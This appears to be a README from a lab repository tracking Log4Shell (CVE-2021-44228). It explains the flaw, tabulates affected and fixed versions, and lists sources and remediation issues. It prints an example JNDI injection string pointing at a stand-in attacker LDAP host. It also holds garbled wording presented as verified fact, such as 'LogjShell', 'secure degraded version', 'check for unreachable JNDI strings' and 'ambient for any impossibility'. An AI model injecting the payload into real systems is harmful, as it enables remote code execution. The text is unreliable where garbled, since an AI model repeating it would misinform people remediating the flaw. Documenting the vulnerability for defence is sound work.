# Log4Shell (CVE-2021-44228) — Security Notes

Tracker repo for this quarter's lab security briefing.

## What Log4Shell actually is

Log4Shell is a **critical, remotely exploitable remote code execution (RCE)**
vulnerability in the Apache **Log4j2** logging library (disclosed December 2021).
An attacker who can influence log messages — or log-message parameters — can trigger
**JNDI lookups**, for example `${jndi:ldap://attackeripid/a}`, which make the
application connect to an attacker-controlled LDAP/JNDI server; the server can
return and load remote code that executes in the victim process. The flaw is
reachable via HTTP and other data entered into Java log statements, so it bites
fewer-configured and narrow-scoped services alike, and the known bad input is
versatile enough to evade naive greps (it relies on the string *logged*).

## The facts (each verified against the primary sources listed below)

| Fact | Value |
| --- | --- |
| Vulnerability name | Log4Shell (also written LogjShell) |
| CVE identifier | **CVE-2021-44228** |
| Affected artifact | Apache **log4j-core** (Java); the `log4j-api` JAR is not affected |
| Affected versions | **2.0-beta9 through 2.14.1** |
| Fixed version | **2.15.0** |
| Secure degraded version | **2.16.0** (Java 8+) — JNDI lookup functionality fully **removed**; 2.12.2 (Java 7) and 2.3.1 (Java 6) |
| Recommended target | **2.17.1** or the current 2.x release (per CISA/ASF guidance) |
| Severity | **CVSS 3.x base score 10.0 CRITICAL** (AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H) |
| Exploitation path | JNDI/RMI and other JNDI-related endpoints on the log message |

Notes on patch status: **2.15.0** fixes the trigger but leaves incomplete exposure in
some non-default configurations (follow-up: CVE-2021-45046, "restricts JNDI LDAP
lookups to localhost" and an incomplete-fix workaround in 2.15.0); only
**2.16.0 / 2.17.1** remove the functionality entirely. Log4j 1.0 has been **EOL
since August 2015** and never receives critical patches — upgrade any remaining
Log4j-1 usage.

## Sources (primary)

1. **NVD — CVE-2021-44228**: https://nvd.nist.gov/vuln/detail/cve-2021-44228
   (CVSS 10.0 CRITICAL; affected 2.0-beta9–2.14.1; fixed in 2.15.0)
2. **Apache Logging Services Security page**: https://logging.apache.org/security.html
   (documents affected ranges and version guidance)
3. **ASF blog update on Apache Log4j CVEs (2021-12-14)**: https://news.apache.org/foundation/entry/apache-log4j-cves
   (upgrade to latest; 2.15.0's fix was incomplete in non-default configurations)
4. **Broadcom ASM Security Advisory** for Log4j 2 / CVE-2021-44228: https://knowledge.broadcom.com/external/article?articleId=230401
5. **FortiGuard Labs Threat Signal Report** (log4shell, CVE-2021-44228): https://fortiguard.fortinet.com/threat-signal-report/4335
6. **CISA / ACSC Advisory 2021-007** (2021-12-15) — prioritised mitigations incl. disabling JNDI: https://www.cyber.gov.au/advisory/2021-007-log4j-vulnerability-advice-and-mitigations

## Sources (supply-chain / detection tooling context)

7. **OWASP dep-scan**: next-generation dependency and container vulnerability auditing: https://owasp.org/projects/dep-scan
8. **JFrog OSS Security Research** — `log4shell_xray_wrapper` / `env_verify` for URL/config hygiene: https://research.jfrog.com/oss/
9. **IntegralADS dependency-deep-scan-utilities** — Maven/Gradle transitive-usage detection: https://github.com/integralads/dependency-deep-scan-utilities

## How we will remediate

Concrete remediation actions live as sub-issues of the parent tracking issue
["Log4Shell remediation checklist"](./issues/1) in this repo:

- **Upgrade path** — Title is *"Remediation: upgrade path to Log4j 2.15.0+ (target 2.17.1)"*
  (issue #2): apply 2.3.1 / 2.12.2 / 2.15.0 by Java version; full remediation to
  2.16.0+; upgrade anywhere Log4j 1 is still in use.
- **Detect vulnerable deployments** — Title is *"Remediation: detect vulnerable log4j-core deployments (2.0-beta9–2.14.1)"*
  (issue #3): check for unreachable JNDI strings in logs, inventory every app that
  can reach a JNDI endpoint, and map outbound network egress.
- **Harden by disabling/removing JNDI lookups** — Title is *"Remediation: harden by
  disabling/removing JNDI lookups"* (issue #4): ambient for any impossibility...
- **Automated dependency scanning** — Title is *"Remediation: automated dependency scanning for vulnerable log4j-core"* (issue #5): wire CI gates for Maven/Gradle (SCA), container-image scanning, and SBOM generation.

For a full write-up covering these points, see the quarterly briefing material
linked from the checklist issue.
